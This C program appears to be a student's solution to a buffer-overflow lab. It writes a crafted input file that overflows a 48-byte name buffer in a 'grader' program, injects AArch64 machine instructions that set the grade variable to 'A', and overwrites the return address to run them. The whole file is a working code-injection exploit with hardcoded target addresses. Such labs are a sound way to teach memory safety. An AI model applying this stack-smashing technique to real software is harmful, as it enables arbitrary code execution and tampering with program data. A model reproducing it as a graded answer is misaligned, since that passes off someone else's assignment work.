/*
creates a file named dataA to manipulate the grader program to assign an 'A' grade.
the file includes:
1. student name followed by a null byte
2. padding to overflow the buffer
3. machine instructions to set the grade to 'A'
4. an overwritten return address directing execution to the injected instructions
*/

#include <stdio.h>
#include <stdint.h>
#include "miniassembler.h"

/*
main function behavior:
- accepts no command-line arguments
- does not read from stdin
- does not write to stdout or stderr (except on failure)
- writes crafted bytes to "dataA" file
- returns 0 on success, non-zero on failure
*/
int main(void) {
    /* student name, truncated to avoid newline characters */
    const char *studentName = "AnishK";
    /* ASCII value for 'A' */
    const unsigned int asciiA = 0x41;

    /* predefined memory addresses based on memory map analysis */
    unsigned long gradeAddr = 0x420044;         /* address of the grade variable */
    unsigned long injectedCodeAddr = 0x42007c;  /* address where injected instructions reside */
    unsigned long returnAddr = 0x40089c;        /* address to jump back after injection */

    /* generate machine instructions */
    unsigned int movInstr = MiniAssembler_mov(0, asciiA);                           /* mov w0, #A */
    unsigned int adrInstr = MiniAssembler_adr(1, gradeAddr, injectedCodeAddr + 4); /* adr x1, gradeAddr */
    unsigned int strbInstr = MiniAssembler_strb(0, 1);                            /* strb w0, [x1] */
    unsigned int branchInstr = MiniAssembler_b(returnAddr, injectedCodeAddr + 12); /* b returnAddr */

    /* open dataA file in binary write mode */
    FILE *file = fopen("dataA", "wb");
    if (!file) {
        return 1; /* exit if file cannot be opened */
    }

    /* write the student's name */
    fwrite(studentName, 1, 6, file); /* "AnishK" is 6 bytes */

    /* append a null byte to terminate the name string */
    fputc('\0', file);

    /* add padding to overflow the buffer (total buffer size 48 bytes) */
    for (int pad = 0; pad < (48 - 7); pad++) { /* 6 name bytes + 1 null */
        fputc('\0', file);
    }

    /* insert the crafted machine instructions */
    fwrite(&movInstr, sizeof(movInstr), 1, file);          /* mov w0, #A */
    fwrite(&adrInstr, sizeof(adrInstr), 1, file);          /* adr x1, gradeAddr */
    fwrite(&strbInstr, sizeof(strbInstr), 1, file);       /* strb w0, [x1] */
    fwrite(&branchInstr, sizeof(branchInstr), 1, file);    /* b returnAddr */

    /* overwrite the return address to point to injected instructions */
    unsigned long fakeReturn = injectedCodeAddr;
    fwrite(&fakeReturn, sizeof(fakeReturn), 1, file);

    /* close the file after writing all data */
    fclose(file);

    return 0; /* indicate successful execution */
}